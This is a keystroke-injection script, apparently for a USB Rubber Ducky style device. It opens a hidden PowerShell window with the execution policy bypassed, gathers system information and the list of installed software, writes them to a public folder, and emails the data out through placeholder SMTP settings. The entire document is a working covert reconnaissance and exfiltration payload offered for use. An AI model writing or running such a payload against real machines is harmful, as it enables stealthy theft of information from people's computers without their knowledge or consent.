REM Open PowerShell as Administrator
DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden
ENTER
DELAY 1000

REM Run PowerShell Command to Collect System Info
STRING $SysInfo = Get-ComputerInfo | Out-String; $Software = Get-WmiObject Win32_Product | Select-Object Name, Version | Out-String;
ENTER
DELAY 500

REM Save System Info to File
STRING $Output = "$SysInfo`n`nInstalled Software:`n$Software"; $Path = "C:\Users\Public\system_info.txt"; Set-Content -Path $Path -Value $Output
ENTER
DELAY 1000

REM Optional: Send via Email (Configure SMTP Settings)
STRING $SMTPServer = "smtp.example.com"; $From = "example@example.com"; $To = "receiver@example.com"; $Subject = "System Info"; $Body = $Output;
ENTER
STRING Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer
ENTER
DELAY 1000

REM Exit PowerShell
STRING exit
ENTER
